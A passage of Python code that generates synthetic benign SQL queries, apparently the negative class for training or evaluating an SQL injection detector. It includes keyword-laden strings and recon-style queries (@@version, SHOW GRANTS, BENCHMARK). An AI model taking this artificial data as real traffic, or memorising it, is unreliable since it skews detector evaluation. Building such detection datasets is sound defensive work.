        lambda: f"SELECT * FROM users WHERE loyalty_points BETWEEN {random.randint(0, 500)} AND {random.randint(1000, 5000)};",
        
        # --- Simple IN clauses ---
        lambda: f"SELECT * FROM users WHERE status IN ({q('active')}, {q('verified')});",
        lambda: f"SELECT * FROM orders WHERE status IN ({q('paid')}, {q('shipped')}, {q('delivered')});",
        lambda: f"SELECT * FROM products WHERE category_id IN ({pick_category_id()}, {pick_category_id()}, {pick_category_id()});",
        lambda: f"SELECT * FROM countries WHERE region IN ({q('EMEA')}, {q('AMER')});",
        lambda: f"SELECT * FROM support_tickets WHERE priority IN ({q('high')}, {q('critical')});",
        lambda: f"SELECT * FROM sessions WHERE device_type IN ({q('desktop')}, {q('mobile')});",
        
        # --- Simple NOT conditions ---
        lambda: f"SELECT * FROM users WHERE status != {q('inactive')};",
        lambda: f"SELECT * FROM users WHERE status <> {q('suspended')};",
        lambda: f"SELECT * FROM products WHERE is_active != 0;",
        lambda: f"SELECT * FROM orders WHERE status != {q('cancelled')};",
        lambda: f"SELECT * FROM products WHERE category_id != {pick_category_id()};",
        
        # --- Simple IS NULL / IS NOT NULL ---
        lambda: f"SELECT * FROM orders WHERE coupon_id IS NULL;",
        lambda: f"SELECT * FROM orders WHERE coupon_id IS NOT NULL;",
        lambda: f"SELECT * FROM orders WHERE notes IS NULL;",
        lambda: f"SELECT * FROM sessions WHERE ended_at IS NULL;",
        lambda: f"SELECT * FROM sessions WHERE ended_at IS NOT NULL;",
        lambda: f"SELECT * FROM support_tickets WHERE resolved_at IS NULL;",
        lambda: f"SELECT * FROM support_tickets WHERE assigned_to IS NOT NULL;",
        lambda: f"SELECT * FROM categories WHERE parent_category_id IS NULL;",
        lambda: f"SELECT * FROM products WHERE description IS NOT NULL;",
        
        # --- Simple boolean conditions ---
        lambda: f"SELECT * FROM users WHERE newsletter_subscribed = 1;",
        lambda: f"SELECT * FROM users WHERE newsletter_subscribed = 0;",
        lambda: f"SELECT * FROM product_reviews WHERE verified_purchase = 1;",
        lambda: f"SELECT * FROM shipping_addresses WHERE is_default = 1;",
        lambda: f"SELECT * FROM subscriptions WHERE auto_renew = 1;",
        lambda: f"SELECT * FROM notifications WHERE is_read = 0;",
        lambda: f"SELECT * FROM notifications WHERE is_read = 1;",
        
        # --- Simple two-condition AND ---
        lambda: f"SELECT * FROM users WHERE status = {q('active')} AND country_code = {q(random.choice([c[0] for c in COUNTRIES]))};",
        lambda: f"SELECT * FROM products WHERE is_active = 1 AND price > {money()};",
        lambda: f"SELECT * FROM products WHERE is_active = 1 AND stock_quantity > 0;",
        lambda: f"SELECT * FROM orders WHERE user_id = {pick_user_id()} AND status = {q(random.choice(ORDER_STATUS))};",
        lambda: f"SELECT * FROM product_reviews WHERE product_id = {pick_product_id()} AND rating >= 4;",
        lambda: f"SELECT * FROM support_tickets WHERE priority = {q('high')} AND ticket_status = {q('open')};",
        lambda: f"SELECT * FROM vendors WHERE is_active = 1 AND rating > 4;",
        lambda: f"SELECT * FROM inventory WHERE product_id = {pick_product_id()} AND quantity > 0;",
        
        # --- Simple two-condition OR ---
        lambda: f"SELECT * FROM users WHERE status = {q('active')} OR status = {q('verified')};",
        lambda: f"SELECT * FROM products WHERE category_id = {pick_category_id()} OR category_id = {pick_category_id()};",
        lambda: f"SELECT * FROM orders WHERE status = {q('pending')} OR status = {q('processing')};",
        lambda: f"SELECT * FROM support_tickets WHERE priority = {q('high')} OR priority = {q('critical')};",
        
        # --- Simple EXISTS (without injection patterns) ---
        lambda: f"SELECT * FROM users u WHERE EXISTS (SELECT 1 FROM orders o WHERE o.user_id = u.user_id);",
        lambda: f"SELECT * FROM products p WHERE EXISTS (SELECT 1 FROM order_items oi WHERE oi.product_id = p.product_id);",
        lambda: f"SELECT * FROM users u WHERE NOT EXISTS (SELECT 1 FROM orders o WHERE o.user_id = u.user_id);",
        
        # --- Simple date comparisons ---
        lambda: f"SELECT * FROM users WHERE created_at > {q(rand_date(date(2024,1,1), date(2025,12,21)))};",
        lambda: f"SELECT * FROM orders WHERE order_date >= {q(rand_date(date(2024,1,1), date(2025,12,21)))};",
        lambda: f"SELECT * FROM orders WHERE order_date < {q(rand_date(date(2024,1,1), date(2025,12,21)))};",
        lambda: f"SELECT * FROM sessions WHERE started_at > {q(rand_date(date(2024,1,1), date(2025,12,21)))};",
        lambda: f"SELECT * FROM product_reviews WHERE created_at >= {q(rand_date(date(2024,1,1), date(2025,12,21)))};",
        
        # --- Very minimal queries (edge cases) ---
        lambda: f"SELECT 1;",
        lambda: f"SELECT 1 + 1;",
        lambda: f"SELECT NULL;",
        lambda: f"SELECT {q('hello')};",
        lambda: f"SELECT CURRENT_DATE;",
        lambda: f"SELECT CURRENT_TIMESTAMP;",
        lambda: f"SELECT NOW();",
        lambda: f"SELECT VERSION();",
        lambda: f"SELECT DATABASE();",
        lambda: f"SELECT USER();",
        
        # --- Table aliases (simple) ---
        lambda: f"SELECT u.user_id, u.email FROM users u;",
        lambda: f"SELECT o.order_id, o.total_amount FROM orders o;",
        lambda: f"SELECT p.product_id, p.name, p.price FROM products p;",
        lambda: f"SELECT p.* FROM products p WHERE p.is_active = 1;",
        lambda: f"SELECT u.* FROM users u WHERE u.status = {q('active')};",
        lambda: f"SELECT o.* FROM orders o WHERE o.user_id = {pick_user_id()};",
        
        # --- Simple single JOIN (no complex conditions) ---
        lambda: f"SELECT * FROM orders o JOIN users u ON o.user_id = u.user_id LIMIT {limit()};",
        lambda: f"SELECT * FROM products p JOIN categories c ON p.category_id = c.category_id LIMIT {limit()};",
        lambda: f"SELECT * FROM order_items oi JOIN products p ON oi.product_id = p.product_id LIMIT {limit()};",
        lambda: f"SELECT * FROM payments pay JOIN orders o ON pay.order_id = o.order_id LIMIT {limit()};",
        lambda: f"SELECT u.email, o.order_id FROM users u JOIN orders o ON u.user_id = o.user_id LIMIT {limit()};",
        lambda: f"SELECT p.name, c.category_name FROM products p JOIN categories c ON p.category_id = c.category_id LIMIT {limit()};",
        
        # --- Simple LEFT JOIN ---
        lambda: f"SELECT * FROM users u LEFT JOIN orders o ON u.user_id = o.user_id LIMIT {limit()};",
        lambda: f"SELECT * FROM products p LEFT JOIN product_reviews pr ON p.product_id = pr.product_id LIMIT {limit()};",
        lambda: f"SELECT u.email, COUNT(o.order_id) FROM users u LEFT JOIN orders o ON u.user_id = o.user_id GROUP BY u.email LIMIT {limit()};",
        
        # --- Simple GROUP BY (single column) ---
        lambda: f"SELECT status, COUNT(*) FROM users GROUP BY status;",
        lambda: f"SELECT status, COUNT(*) FROM orders GROUP BY status;",
        lambda: f"SELECT country_code, COUNT(*) FROM users GROUP BY country_code;",
        lambda: f"SELECT category_id, COUNT(*) FROM products GROUP BY category_id;",
        lambda: f"SELECT vendor_id, COUNT(*) FROM products GROUP BY vendor_id;",
        lambda: f"SELECT priority, COUNT(*) FROM support_tickets GROUP BY priority;",
        lambda: f"SELECT device_type, COUNT(*) FROM sessions GROUP BY device_type;",
        lambda: f"SELECT rating, COUNT(*) FROM product_reviews GROUP BY rating;",
        lambda: f"SELECT user_id, SUM(total_amount) FROM orders GROUP BY user_id LIMIT {limit()};",
        lambda: f"SELECT product_id, AVG(rating) FROM product_reviews GROUP BY product_id LIMIT {limit()};",
        
        # --- Simple column expressions ---
        lambda: f"SELECT user_id, email, UPPER(first_name) FROM users LIMIT {limit()};",
        lambda: f"SELECT user_id, email, LOWER(email) FROM users LIMIT {limit()};",
        lambda: f"SELECT product_id, name, price * 1.1 AS price_with_tax FROM products LIMIT {limit()};",
        lambda: f"SELECT order_id, total_amount, total_amount * 0.18 AS tax FROM orders LIMIT {limit()};",
        lambda: f"SELECT user_id, CONCAT(first_name, ' ', last_name) AS full_name FROM users LIMIT {limit()};",
        lambda: f"SELECT product_id, name, LENGTH(name) AS name_length FROM products LIMIT {limit()};",
        
        # --- Simple CASE expressions ---
        lambda: f"SELECT user_id, status, CASE WHEN status = 'active' THEN 'Yes' ELSE 'No' END AS is_active FROM users LIMIT {limit()};",
        lambda: f"SELECT product_id, price, CASE WHEN price > 100 THEN 'expensive' ELSE 'cheap' END AS price_category FROM products LIMIT {limit()};",
        lambda: f"SELECT order_id, total_amount, CASE WHEN total_amount > 500 THEN 'large' WHEN total_amount > 100 THEN 'medium' ELSE 'small' END AS order_size FROM orders LIMIT {limit()};",
        
        # --- Fully qualified table names (some databases use this) ---
        lambda: f"SELECT * FROM public.users LIMIT {limit()};",
        lambda: f"SELECT * FROM dbo.orders LIMIT {limit()};",
        lambda: f"SELECT * FROM main.products LIMIT {limit()};",
        
        # --- OFFSET queries ---
        lambda: f"SELECT * FROM users LIMIT {limit()} OFFSET {random.randint(0, 100)};",
        lambda: f"SELECT * FROM products ORDER BY product_id LIMIT {limit()} OFFSET {random.randint(0, 100)};",
        lambda: f"SELECT * FROM orders ORDER BY order_date DESC LIMIT {limit()} OFFSET {random.randint(0, 50)};",
        
        # =====================================================================
        # ADDITIONAL TEMPLATES TO FIX FALSE POSITIVES (based on evaluation)
        # =====================================================================
        
        # --- Extended ORDER BY templates (major false positive source) ---
        lambda: f"SELECT * FROM users ORDER BY user_id;",
        lambda: f"SELECT * FROM users ORDER BY user_id ASC;",
        lambda: f"SELECT * FROM users ORDER BY user_id DESC;",
        lambda: f"SELECT * FROM users ORDER BY email;",
        lambda: f"SELECT * FROM users ORDER BY email ASC;",
        lambda: f"SELECT * FROM users ORDER BY first_name;",
        lambda: f"SELECT * FROM users ORDER BY last_name DESC;",
        lambda: f"SELECT * FROM users ORDER BY created_at;",
        lambda: f"SELECT * FROM users ORDER BY created_at ASC;",
        lambda: f"SELECT * FROM users ORDER BY status;",
        lambda: f"SELECT * FROM orders ORDER BY order_id;",
        lambda: f"SELECT * FROM orders ORDER BY order_id ASC;",
        lambda: f"SELECT * FROM orders ORDER BY order_id DESC;",
        lambda: f"SELECT * FROM orders ORDER BY order_date;",
        lambda: f"SELECT * FROM orders ORDER BY order_date ASC;",
        lambda: f"SELECT * FROM orders ORDER BY total_amount;",
        lambda: f"SELECT * FROM orders ORDER BY total_amount DESC;",
        lambda: f"SELECT * FROM orders ORDER BY status;",
        lambda: f"SELECT * FROM products ORDER BY product_id;",
        lambda: f"SELECT * FROM products ORDER BY product_id ASC;",
        lambda: f"SELECT * FROM products ORDER BY product_id DESC;",
        lambda: f"SELECT * FROM products ORDER BY name;",
        lambda: f"SELECT * FROM products ORDER BY name ASC;",
        lambda: f"SELECT * FROM products ORDER BY price;",
        lambda: f"SELECT * FROM products ORDER BY price ASC;",
        lambda: f"SELECT * FROM products ORDER BY price DESC;",
        lambda: f"SELECT * FROM products ORDER BY created_at DESC;",
        lambda: f"SELECT * FROM products ORDER BY stock_quantity;",
        lambda: f"SELECT * FROM products ORDER BY category_id;",
        lambda: f"SELECT * FROM payments ORDER BY payment_id;",
        lambda: f"SELECT * FROM payments ORDER BY payment_date DESC;",
        lambda: f"SELECT * FROM sessions ORDER BY started_at DESC;",
        lambda: f"SELECT * FROM support_tickets ORDER BY created_at DESC;",
        lambda: f"SELECT * FROM product_reviews ORDER BY created_at DESC;",
        lambda: f"SELECT * FROM product_reviews ORDER BY rating DESC;",
        lambda: f"SELECT * FROM vendors ORDER BY vendor_name;",
        lambda: f"SELECT * FROM categories ORDER BY category_name;",
        lambda: f"SELECT * FROM inventory ORDER BY quantity DESC;",
        lambda: f"SELECT * FROM notifications ORDER BY created_at DESC;",
        lambda: f"SELECT user_id, email FROM users ORDER BY email;",
        lambda: f"SELECT product_id, name, price FROM products ORDER BY price;",
        lambda: f"SELECT order_id, total_amount FROM orders ORDER BY total_amount DESC;",
        lambda: f"SELECT * FROM {random.choice(list(TABLES.keys()))} ORDER BY 1;",
        lambda: f"SELECT * FROM {random.choice(list(TABLES.keys()))} ORDER BY 1 ASC;",
        lambda: f"SELECT * FROM {random.choice(list(TABLES.keys()))} ORDER BY 1 DESC;",
        
        # --- Multi-column ORDER BY ---
        lambda: f"SELECT * FROM users ORDER BY last_name, first_name;",
        lambda: f"SELECT * FROM users ORDER BY status, created_at DESC;",
        lambda: f"SELECT * FROM products ORDER BY category_id, price DESC;",
        lambda: f"SELECT * FROM products ORDER BY is_active DESC, name ASC;",
        lambda: f"SELECT * FROM orders ORDER BY user_id, order_date DESC;",
        lambda: f"SELECT * FROM orders ORDER BY status, total_amount DESC;",
        lambda: f"SELECT * FROM product_reviews ORDER BY product_id, rating DESC;",
        
        # --- ORDER BY with LIMIT (common pattern) ---
        lambda: f"SELECT * FROM users ORDER BY user_id LIMIT {limit()};",
        lambda: f"SELECT * FROM users ORDER BY email LIMIT {limit()};",
        lambda: f"SELECT * FROM users ORDER BY created_at LIMIT {limit()};",
        lambda: f"SELECT * FROM users ORDER BY created_at DESC LIMIT {limit()};",
        lambda: f"SELECT * FROM products ORDER BY product_id LIMIT {limit()};",
        lambda: f"SELECT * FROM products ORDER BY price LIMIT {limit()};",
        lambda: f"SELECT * FROM products ORDER BY price ASC LIMIT {limit()};",
        lambda: f"SELECT * FROM products ORDER BY created_at DESC LIMIT {limit()};",
        lambda: f"SELECT * FROM orders ORDER BY order_id LIMIT {limit()};",
        lambda: f"SELECT * FROM orders ORDER BY order_date LIMIT {limit()};",
        lambda: f"SELECT * FROM orders ORDER BY total_amount DESC LIMIT {limit()};",
        lambda: f"SELECT user_id, email FROM users ORDER BY user_id LIMIT {limit()};",
        lambda: f"SELECT product_id, name FROM products ORDER BY name LIMIT {limit()};",
        lambda: f"SELECT * FROM {random.choice(list(TABLES.keys()))} ORDER BY 1 LIMIT {limit()};",
        
        # --- Extended minimal/utility queries (another false positive source) ---
        lambda: f"SELECT @@version;",
        lambda: f"SELECT @@hostname;",
        lambda: f"SELECT @@datadir;",
        lambda: f"SELECT @@port;",
        lambda: f"SELECT @@sql_mode;",
        lambda: f"SELECT @@autocommit;",
        lambda: f"SELECT @@tx_isolation;",
        lambda: f"SELECT @@max_connections;",
        lambda: f"SELECT CURRENT_USER;",
        lambda: f"SELECT CURRENT_USER();",
        lambda: f"SELECT SESSION_USER();",
        lambda: f"SELECT SYSTEM_USER();",
        lambda: f"SELECT SCHEMA();",
        lambda: f"SELECT CATALOG();",
        lambda: f"SELECT UUID();",
        lambda: f"SELECT RAND();",
        lambda: f"SELECT RAND() * 100;",
        lambda: f"SELECT PI();",
        lambda: f"SELECT CURDATE();",
        lambda: f"SELECT CURTIME();",
        lambda: f"SELECT SYSDATE();",
        lambda: f"SELECT LOCALTIME();",
        lambda: f"SELECT LOCALTIMESTAMP();",
        lambda: f"SELECT UTC_DATE();",
        lambda: f"SELECT UTC_TIME();",
        lambda: f"SELECT UTC_TIMESTAMP();",
        lambda: f"SELECT UNIX_TIMESTAMP();",
        lambda: f"SELECT FROM_UNIXTIME({random.randint(1600000000, 1700000000)});",
        lambda: f"SELECT LAST_INSERT_ID();",
        lambda: f"SELECT ROW_COUNT();",
        lambda: f"SELECT FOUND_ROWS();",
        lambda: f"SELECT CONNECTION_ID();",
        lambda: f"SELECT BENCHMARK(1000, MD5('test'));",
        lambda: f"SELECT MD5({q('password123')});",
        lambda: f"SELECT SHA1({q('secret')});",
        lambda: f"SELECT SHA2({q('data')}, 256);",
        lambda: f"SELECT HEX({q('hello')});",
        lambda: f"SELECT UNHEX('48656C6C6F');",
        lambda: f"SELECT INET_ATON('192.168.1.1');",
        lambda: f"SELECT INET_NTOA(3232235777);",
        lambda: f"SELECT INET6_ATON('::1');",
        lambda: f"SELECT AES_ENCRYPT({q('data')}, {q('key')});",
        lambda: f"SELECT COMPRESS({q('long text here')});",
        lambda: f"SELECT ENCODE({q('text')}, {q('key')});",
        lambda: f"SELECT CHAR(65, 66, 67);",
        lambda: f"SELECT ASCII('A');",
        lambda: f"SELECT ORD('A');",
        lambda: f"SELECT LENGTH({q('hello world')});",
        lambda: f"SELECT CHAR_LENGTH({q('hello')});",
        lambda: f"SELECT BIT_LENGTH({q('hello')});",
        lambda: f"SELECT REVERSE({q('hello')});",
        lambda: f"SELECT REPEAT({q('ab')}, 5);",
        lambda: f"SELECT SPACE(10);",
        lambda: f"SELECT LPAD({q('test')}, 10, {q('0')});",
        lambda: f"SELECT RPAD({q('test')}, 10, {q('x')});",
        lambda: f"SELECT TRIM({q('  hello  ')});",
        lambda: f"SELECT LTRIM({q('  hello')});",
        lambda: f"SELECT RTRIM({q('hello  ')});",
        lambda: f"SELECT REPLACE({q('hello')}, {q('l')}, {q('L')});",
        lambda: f"SELECT SUBSTRING({q('hello world')}, 1, 5);",
        lambda: f"SELECT SUBSTR({q('hello')}, 2, 3);",
        lambda: f"SELECT LEFT({q('hello')}, 2);",
        lambda: f"SELECT RIGHT({q('hello')}, 2);",
        lambda: f"SELECT INSTR({q('hello')}, {q('l')});",
        lambda: f"SELECT LOCATE({q('l')}, {q('hello')});",
        lambda: f"SELECT POSITION({q('l')} IN {q('hello')});",
        lambda: f"SELECT FIELD({q('b')}, {q('a')}, {q('b')}, {q('c')});",
        lambda: f"SELECT ELT(2, {q('a')}, {q('b')}, {q('c')});",
        lambda: f"SELECT CONCAT_WS('-', {q('a')}, {q('b')}, {q('c')});",
        lambda: f"SELECT FORMAT(12345.6789, 2);",
        lambda: f"SELECT ROUND(123.456, 2);",
        lambda: f"SELECT FLOOR(123.9);",
        lambda: f"SELECT CEIL(123.1);",
        lambda: f"SELECT CEILING(123.1);",
        lambda: f"SELECT TRUNCATE(123.456, 1);",
        lambda: f"SELECT ABS(-123);",
        lambda: f"SELECT SIGN(-5);",
        lambda: f"SELECT MOD(10, 3);",
        lambda: f"SELECT POW(2, 10);",
        lambda: f"SELECT POWER(2, 8);",
        lambda: f"SELECT SQRT(144);",
        lambda: f"SELECT EXP(1);",
        lambda: f"SELECT LOG(10);",
        lambda: f"SELECT LOG10(100);",
        lambda: f"SELECT LOG2(8);",
        lambda: f"SELECT LN(2.718281828);",
        lambda: f"SELECT SIN(0);",
        lambda: f"SELECT COS(0);",
        lambda: f"SELECT TAN(0);",
        lambda: f"SELECT GREATEST(1, 5, 3);",
        lambda: f"SELECT LEAST(1, 5, 3);",
        lambda: f"SELECT COALESCE(NULL, NULL, 'default');",
        lambda: f"SELECT NULLIF(1, 1);",
        lambda: f"SELECT IFNULL(NULL, 'default');",
        lambda: f"SELECT IF(1 > 0, 'yes', 'no');",
        lambda: f"SELECT DATE_FORMAT(NOW(), '%Y-%m-%d');",
        lambda: f"SELECT DATE_ADD(NOW(), INTERVAL 7 DAY);",
        lambda: f"SELECT DATE_SUB(NOW(), INTERVAL 1 MONTH);",
        lambda: f"SELECT DATEDIFF(NOW(), DATE_SUB(NOW(), INTERVAL 30 DAY));",
        lambda: f"SELECT TIMESTAMPDIFF(HOUR, '2024-01-01', NOW());",
        lambda: f"SELECT DAYNAME(NOW());",
        lambda: f"SELECT MONTHNAME(NOW());",
        lambda: f"SELECT DAYOFWEEK(NOW());",
        lambda: f"SELECT DAYOFMONTH(NOW());",
        lambda: f"SELECT DAYOFYEAR(NOW());",
        lambda: f"SELECT WEEKOFYEAR(NOW());",
        lambda: f"SELECT YEAR(NOW());",
        lambda: f"SELECT MONTH(NOW());",
        lambda: f"SELECT DAY(NOW());",
        lambda: f"SELECT HOUR(NOW());",
        lambda: f"SELECT MINUTE(NOW());",
        lambda: f"SELECT SECOND(NOW());",
        lambda: f"SELECT QUARTER(NOW());",
        lambda: f"SELECT WEEK(NOW());",
        lambda: f"SELECT EXTRACT(YEAR FROM NOW());",
        lambda: f"SELECT EXTRACT(MONTH FROM NOW());",
        lambda: f"SELECT STR_TO_DATE('2024-12-25', '%Y-%m-%d');",
        lambda: f"SELECT TIME_TO_SEC('01:30:00');",
        lambda: f"SELECT SEC_TO_TIME(5400);",
        lambda: f"SELECT CAST(123 AS CHAR);",
        lambda: f"SELECT CAST('123' AS SIGNED);",
        lambda: f"SELECT CONVERT('123', SIGNED);",
        lambda: f"SELECT BIN(255);",
        lambda: f"SELECT OCT(64);",
        lambda: f"SELECT CONV(15, 10, 16);",
        
        # --- SHOW commands (common admin queries) ---
        lambda: f"SHOW DATABASES;",
        lambda: f"SHOW TABLES;",
        lambda: f"SHOW TABLES FROM {random.choice(['mysql', 'information_schema', 'mydb'])};",
        lambda: f"SHOW COLUMNS FROM users;",
        lambda: f"SHOW COLUMNS FROM products;",
        lambda: f"SHOW COLUMNS FROM orders;",
        lambda: f"SHOW INDEX FROM users;",
        lambda: f"SHOW INDEX FROM products;",
        lambda: f"SHOW CREATE TABLE users;",
        lambda: f"SHOW CREATE TABLE products;",
        lambda: f"SHOW CREATE TABLE orders;",
        lambda: f"SHOW TABLE STATUS;",
        lambda: f"SHOW TABLE STATUS LIKE 'users';",
        lambda: f"SHOW FULL TABLES;",
        lambda: f"SHOW FULL COLUMNS FROM users;",
        lambda: f"SHOW GRANTS;",
        lambda: f"SHOW GRANTS FOR CURRENT_USER;",
        lambda: f"SHOW PRIVILEGES;",
        lambda: f"SHOW PROCESSLIST;",
        lambda: f"SHOW FULL PROCESSLIST;",
        lambda: f"SHOW STATUS;",
        lambda: f"SHOW STATUS LIKE 'Connections';",
        lambda: f"SHOW STATUS LIKE 'Uptime';",
        lambda: f"SHOW STATUS LIKE 'Threads%';",
        lambda: f"SHOW GLOBAL STATUS;",
        lambda: f"SHOW SESSION STATUS;",
        lambda: f"SHOW VARIABLES;",
        lambda: f"SHOW VARIABLES LIKE 'version%';",
        lambda: f"SHOW VARIABLES LIKE 'max%';",
        lambda: f"SHOW GLOBAL VARIABLES;",
        lambda: f"SHOW SESSION VARIABLES;",
        lambda: f"SHOW WARNINGS;",
        lambda: f"SHOW ERRORS;",
        lambda: f"SHOW ENGINE INNODB STATUS;",
        lambda: f"SHOW ENGINES;",
        lambda: f"SHOW STORAGE ENGINES;",
        lambda: f"SHOW CHARSET;",
        lambda: f"SHOW CHARACTER SET;",
        lambda: f"SHOW COLLATION;",
        lambda: f"SHOW PLUGINS;",
        lambda: f"SHOW MASTER STATUS;",
        lambda: f"SHOW SLAVE STATUS;",
        lambda: f"SHOW BINARY LOGS;",
        lambda: f"SHOW BINLOG EVENTS;",
        
        # --- DESCRIBE/EXPLAIN ---
        lambda: f"DESCRIBE users;",
        lambda: f"DESCRIBE products;",
        lambda: f"DESCRIBE orders;",
        lambda: f"DESC users;",
        lambda: f"DESC products;",
        lambda: f"DESC orders;",
        lambda: f"EXPLAIN SELECT * FROM users;",
        lambda: f"EXPLAIN SELECT * FROM products WHERE price > 100;",
        lambda: f"EXPLAIN SELECT * FROM orders WHERE user_id = 1;",
        lambda: f"EXPLAIN ANALYZE SELECT * FROM users WHERE status = 'active';",
        lambda: f"EXPLAIN FORMAT=JSON SELECT * FROM products;",
        
        # --- CTEs (Common Table Expressions) ---
        lambda: f"WITH active_users AS (SELECT * FROM users WHERE status = 'active') SELECT * FROM active_users;",
        lambda: f"WITH recent_orders AS (SELECT * FROM orders WHERE order_date > DATE_SUB(NOW(), INTERVAL 30 DAY)) SELECT * FROM recent_orders;",
        lambda: f"WITH top_products AS (SELECT product_id, name, price FROM products ORDER BY price DESC LIMIT 10) SELECT * FROM top_products;",
        lambda: f"WITH user_stats AS (SELECT user_id, COUNT(*) as order_count FROM orders GROUP BY user_id) SELECT * FROM user_stats WHERE order_count > 5;",
        lambda: f"WITH cte1 AS (SELECT * FROM users), cte2 AS (SELECT * FROM orders) SELECT cte1.email, cte2.total_amount FROM cte1 JOIN cte2 ON cte1.user_id = cte2.user_id LIMIT {limit()};",
        
        # --- Window functions ---
        lambda: f"SELECT *, ROW_NUMBER() OVER (ORDER BY created_at) as rn FROM users;",
        lambda: f"SELECT *, ROW_NUMBER() OVER (PARTITION BY status ORDER BY created_at) as rn FROM users;",
        lambda: f"SELECT *, RANK() OVER (ORDER BY price DESC) as price_rank FROM products;",
        lambda: f"SELECT *, DENSE_RANK() OVER (ORDER BY total_amount DESC) as order_rank FROM orders;",
        lambda: f"SELECT *, NTILE(4) OVER (ORDER BY price) as quartile FROM products;",
        lambda: f"SELECT *, LAG(price) OVER (ORDER BY product_id) as prev_price FROM products;",
        lambda: f"SELECT *, LEAD(price) OVER (ORDER BY product_id) as next_price FROM products;",
        lambda: f"SELECT *, FIRST_VALUE(name) OVER (PARTITION BY category_id ORDER BY price) as cheapest FROM products;",
        lambda: f"SELECT *, LAST_VALUE(name) OVER (PARTITION BY category_id ORDER BY price) as most_expensive FROM products;",
        lambda: f"SELECT *, SUM(total_amount) OVER (PARTITION BY user_id ORDER BY order_date) as running_total FROM orders;",
        lambda: f"SELECT *, AVG(price) OVER (PARTITION BY category_id) as avg_category_price FROM products;",
        lambda: f"SELECT *, COUNT(*) OVER (PARTITION BY category_id) as category_count FROM products;",
        lambda: f"SELECT user_id, order_date, total_amount, SUM(total_amount) OVER (ORDER BY order_date ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) as cumulative FROM orders;",
        
        # --- JSON operations (modern queries) ---
        lambda: f"SELECT JSON_OBJECT('id', user_id, 'email', email) FROM users LIMIT {limit()};",
        lambda: f"SELECT JSON_ARRAY(user_id, email, status) FROM users LIMIT {limit()};",
        lambda: f"SELECT JSON_EXTRACT(data, '$.name') FROM products WHERE data IS NOT NULL LIMIT {limit()};",
        lambda: f"SELECT JSON_UNQUOTE(JSON_EXTRACT(data, '$.value')) FROM orders WHERE data IS NOT NULL LIMIT {limit()};",
        lambda: f"SELECT JSON_KEYS(metadata) FROM products WHERE metadata IS NOT NULL LIMIT {limit()};",
        lambda: f"SELECT JSON_LENGTH(items) FROM orders WHERE items IS NOT NULL LIMIT {limit()};",
        lambda: "SELECT * FROM products WHERE JSON_CONTAINS(tags, '\"electronics\"') LIMIT " + str(limit()) + ";",
        lambda: f"SELECT JSON_SET(data, '$.updated', NOW()) FROM users WHERE data IS NOT NULL LIMIT {limit()};",
        lambda: "SELECT JSON_MERGE_PATCH(config, '{\"enabled\": true}') FROM settings LIMIT " + str(limit()) + ";",
        
        # --- Strings containing SQL keywords (edge cases - major false positive source) ---
        lambda: f"SELECT * FROM products WHERE name = {q('SELECT All Bundle')};",
        lambda: f"SELECT * FROM products WHERE name = {q('DROP Shoulder Shirt')};",
        lambda: f"SELECT * FROM products WHERE name = {q('DELETE Key Organizer')};",
        lambda: f"SELECT * FROM products WHERE name = {q('INSERT Coin Here')};",
        lambda: f"SELECT * FROM products WHERE name = {q('UPDATE Your Wardrobe')};",
        lambda: f"SELECT * FROM products WHERE name = {q('TRUNCATE Free Diet')};",
        lambda: f"SELECT * FROM products WHERE name = {q('ALTER Ego Perfume')};",
        lambda: f"SELECT * FROM products WHERE name = {q('EXEC Electronics')};",
        lambda: f"SELECT * FROM products WHERE name = {q('UNION Station Bag')};",
        lambda: f"SELECT * FROM products WHERE name = {q('OR Gate Circuit')};",
        lambda: f"SELECT * FROM products WHERE name = {q('AND Logic Board')};",
        lambda: f"SELECT * FROM products WHERE name = {q('1=1 Math Game')};",
        lambda: f"SELECT * FROM products WHERE name = {q('NULL Set Theory Book')};",
        lambda: f"SELECT * FROM products WHERE name = {q('TRUE Love Perfume')};",
        lambda: f"SELECT * FROM products WHERE name = {q('FALSE Eyelashes')};",
        lambda: f"SELECT * FROM products WHERE description = {q('This product is great -- you will love it!')};",
        lambda: f"SELECT * FROM products WHERE description = {q('Buy one; get one free!')};",
        lambda: f"SELECT * FROM products WHERE description = {q('100% satisfaction or your money back')};",
        lambda: f"SELECT * FROM reviews WHERE comment = {q('Works as expected -- no issues')};",
        lambda: f"SELECT * FROM reviews WHERE comment = {q('Love it; will buy again!')};",
        lambda: f"SELECT * FROM users WHERE bio = {q('I love SQL databases -- especially MySQL!')};",
        lambda: f"SELECT * FROM users WHERE bio = {q('Developer; programmer; enthusiast')};",
        lambda: f"SELECT * FROM tickets WHERE subject = {q('Help -- urgent issue!')};",
        lambda: f"SELECT * FROM tickets WHERE subject = {q('Password reset; account locked')};",
        lambda: f"SELECT * FROM logs WHERE message = {q('Query executed -- 100 rows returned')};",
        lambda: f"SELECT * FROM logs WHERE message = {q('User logged in; session started')};",
        lambda: f"SELECT * FROM settings WHERE value = {q('1=1')};",
        lambda: f"SELECT * FROM products WHERE sku = {q('DROP-SHIP-001')};",
        lambda: f"SELECT * FROM products WHERE sku = {q('UNION-JACK-FLAG')};",
        lambda: f"SELECT * FROM products WHERE sku = {q('SELECT-ALL-001')};",
        lambda: f"SELECT * FROM products WHERE sku = {q('OR-GATE-CIRCUIT')};",
        lambda: f"SELECT * FROM users WHERE username = {q('admin_select')};",
        lambda: f"SELECT * FROM users WHERE username = {q('drop_master')};",
        lambda: f"SELECT * FROM users WHERE username = {q('union_worker')};",
        lambda: (lambda fn, ln: f"SELECT * FROM users WHERE name = {q(fn + ' ' + ln)};")(random.choice(FIRST_NAMES), "O'Brien"),
        lambda: (lambda fn, ln: f"SELECT * FROM users WHERE name = {q(fn + ' ' + ln)};")(random.choice(FIRST_NAMES), "D'Angelo"),
        lambda: "SELECT * FROM contacts WHERE company = " + q(random.choice(["O'Reilly Media", "Ben & Jerry's", "AT&T", "Johnson & Johnson"])) + ";",
        
        # --- More complex benign patterns ---
        lambda: f"SELECT u.*, COUNT(o.order_id) AS order_count FROM users u LEFT JOIN orders o ON u.user_id = o.user_id GROUP BY u.user_id HAVING order_count >= 0 ORDER BY order_count DESC LIMIT {limit()};",
        lambda: f"SELECT p.*, COALESCE(AVG(r.rating), 0) AS avg_rating FROM products p LEFT JOIN product_reviews r ON p.product_id = r.product_id GROUP BY p.product_id ORDER BY avg_rating DESC LIMIT {limit()};",
        lambda: f"SELECT DATE(order_date) AS date, COUNT(*) AS orders, SUM(total_amount) AS revenue FROM orders GROUP BY DATE(order_date) ORDER BY date DESC LIMIT 30;",
